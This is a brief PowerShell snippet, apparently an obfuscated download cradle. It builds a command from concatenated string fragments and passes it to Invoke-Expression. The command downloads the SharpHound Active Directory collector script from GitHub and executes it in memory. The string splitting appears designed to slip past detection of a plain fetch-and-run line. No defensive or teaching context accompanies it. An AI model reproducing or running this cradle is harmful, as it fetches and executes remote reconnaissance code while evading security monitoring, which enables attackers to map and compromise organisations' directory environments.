$pre = '[ScriptBlock]::Create('
$mid = '" . ([System.Net.WebClient]::new()).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'')"'
$post = ')'
$joined = $pre + $mid + $post
$sb = Invoke-Expression $joined
& $sb
